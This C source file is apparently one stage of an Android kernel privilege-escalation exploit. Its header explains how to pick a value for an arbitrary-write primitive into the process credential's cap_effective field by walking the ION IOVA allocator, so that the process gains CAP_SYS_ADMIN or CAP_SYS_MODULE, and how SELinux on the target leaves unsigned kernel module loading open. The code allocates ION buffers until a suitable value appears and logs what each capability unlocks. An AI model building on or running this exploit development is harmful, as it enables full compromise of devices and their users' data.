/* k126: CAP_SYS_ADMIN is reachable after all - and it is the strongest one available.
 *
 * For many rounds the store value was treated as fixed at 0x80000000, so the only
 * capability obtainable was bit 31, CAP_SETFCAP. That was wrong.
 *
 * The stored value is meta->iova, and the IOVA allocator hands out
 * 0x80000000 + k*4096 for the k-th page of the mapping. So the value we write is
 *
 *     0x80000000 | (k << 12)
 *
 * which means bits 12..30 of the value are ARBITRARY - they are just the page index.
 * Bit 31 is always set, and bits 0..11 are always zero, but everything in between can
 * be chosen by allocating enough buffers to walk k up to the value we want.
 *
 * Written into cred+56 (the low half of cap_effective) that gives us any capability
 * in the range 12..31, plus CAP_SETFCAP:
 *
 *     k = 0x200   ->  iova 0x80200000  ->  bit 21 = CAP_SYS_ADMIN
 *     k = 0x2F0   ->  iova 0x802f0000  ->  bits 16,17,18,19,21,31 at once
 *
 * Cost: one 4 KB ION buffer per step, so k = 0x200 costs 513 pages = 2 MB. That is
 * affordable, and it is why this is worth doing rather than settling for CAP_SETFCAP.
 *
 * CAP_SYS_ADMIN is in turn the key that opens several doors at once:
 *
 *   - setxattr of any security.* attribute other than security.capability is gated
 *     purely on capable(CAP_SYS_ADMIN) in selinux_inode_setotherxattr
 *   - security_kernel_module_from_file is a no-op here: SELinux does not register it
 *     and security_fixup_ops fills it with cap_kernel_module_from_file() which
 *     returns 0, so init_module() is gated only on capable(CAP_SYS_MODULE) and
 *     modules_disabled - and modules_disabled is 0
 *   - CAP_SYS_MODULE is bit 16, reachable at k = 0x10, so module loading needs only
 *     17 pages of ION
 *
 * This program measures the mapping rather than assuming it: it allocates buffers
 * until the reported IOVA carries the capability bit it wants, and prints the exact
 * value that will be stored. It performs no kernel store.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PGSZ 4096

static FILE *LOG;
static void say(const char *fmt, ...){
    char b[400]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static const char *capname(int c){
    static const char *n[32] = {
        "CAP_CHOWN","DAC_OVERRIDE","DAC_READ_SEARCH","FOWNER","FSETID","KILL",
        "SETGID","SETUID","SETPCAP","LINUX_IMMUTABLE","NET_BIND_SERVICE","NET_BROADCAST",
        "NET_ADMIN","NET_RAW","IPC_LOCK","IPC_OWNER","SYS_MODULE","SYS_RAWIO",
        "SYS_CHROOT","SYS_PTRACE","SYS_PACCT","SYS_ADMIN","SYS_BOOT","SYS_NICE",
        "SYS_RESOURCE","SYS_TIME","SYS_TTY_CONFIG","MKNOD","LEASE","AUDIT_WRITE",
        "AUDIT_CONTROL","SETFCAP"
    };
    return (c >= 0 && c < 32) ? n[c] : "?";
}
static void showcaps(u32 v){
    for (int b = 0; b < 32; b++)
        if ((v >> b) & 1) say(" %s", capname(b));
}

int main(void){
    LOG = fopen("/data/local/tmp/k126.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k126 pid=%d uid=%d -- the store value is NOT fixed at 0x80000000\n",
        getpid(), getuid());
    say("value = 0x80000000 | (k << 12), so bits 12..30 are chosen by the IOVA index\n");
    say("no kernel store is performed by this program\n");

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){ rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl); }
    int fd = open("/dev/ion", O_RDWR);
    if (fd < 0){ say("open errno=%d\n", errno); return 0; }

    say("--- walking the IOVA allocator with 4 KB buffers from heap bit 0 ---\n");
    int  target_k_cap = 21;    /* CAP_SYS_ADMIN */
    u32  best = 0; int bestk = -1;
    int  nalloc = 0;
    static int keep_h[1200]; static int keep_f[1200];
    int kh = 0, kf = 0;
    for (int k = 0; k < 1200; k++){
        struct ion_allocation_data a;
        memset(&a, 0, sizeof a);
        a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
        if (ioctl(fd, ION_IOC_ALLOC, &a) < 0){ say("  alloc failed at k=%d errno=%d\n", k, errno); break; }
        struct ion_fd_data sh; memset(&sh, 0, sizeof sh); sh.handle = a.handle;
        if (ioctl(fd, ION_IOC_SHARE, &sh) < 0){ say("  share failed at k=%d\n", k); break; }
        struct ion_phys_data ph; memset(&ph, 0, sizeof ph);
        ph.fd = sh.fd; ph.flags = ION_BUFFER_TYPE_DMA;
        if (ioctl(fd, ION_IOC_PHYS, &ph) < 0){ say("  phys failed at k=%d\n", k); close(sh.fd); break; }
        nalloc++;
        if (k < 6 || (k % 128) == 127)
            say("  k=%-4d iova=0x%08x caps:", k, ph.addr);
        if (k < 6){ showcaps(ph.addr); say("\n"); }
        else if ((k % 128) == 127){ showcaps(ph.addr); say("\n"); }
        if ((ph.addr >> target_k_cap) & 1){ best = ph.addr; bestk = k; }
        if (kh < 1200){ keep_h[kh++] = a.handle; keep_f[kf++] = sh.fd; }
    }
    say("  allocated %d buffers (%d KB)\n", nalloc, nalloc * PGSZ / 1024);

    say("--- result ---\n");
    if (bestk >= 0){
        say("  the first IOVA carrying CAP_SYS_ADMIN arrives at k=%d:\n", bestk);
        say("    value 0x%08x  -> caps:", best);
        showcaps(best); say("\n");
        say("  cost: %d buffers = %d KB of ION memory\n", bestk + 1, (bestk + 1) * PGSZ / 1024);
        say("  storing this value at cred+56 gives cap_effective = 0x%08x\n", best);
    } else {
        say("  no IOVA in the walked range set bit %d; the allocator may not have a\n"
            "  contiguous mapping that large, or the base differs\n", target_k_cap);
    }

    say("--- what each reachable capability buys ---\n");
    say("  CAP_SYS_MODULE (16)  k=0x10 -> 17 buffers, 68 KB\n");
    say("     init_module() checks only capable(CAP_SYS_MODULE) and modules_disabled;\n");
    say("     security_kernel_module_from_file is not registered by SELinux and is\n");
    say("     filled by cap_kernel_module_from_file() which returns 0, and\n");
    say("     modules_disabled is 0, so an unsigned .ko loads\n");
    say("  CAP_SYS_ADMIN (21)   k=0x200 -> 513 buffers, 2052 KB\n");
    say("     unlocks security.* xattr writes other than security.capability\n");
    say("  CAP_SYS_RAWIO (17)   k=0x20 -> 33 buffers, 132 KB\n");
    say("  CAP_SYS_PTRACE (19)  k=0x80 -> 129 buffers, 516 KB\n");

    say("--- cleanup ---\n");
    for (int i = 0; i < kh; i++){
        close(keep_f[i]);
        struct ion_handle_data h; h.handle = keep_h[i];
        ioctl(fd, ION_IOC_FREE, &h);
    }
    close(fd);
    say("K126 done\n");
    return 0;
}
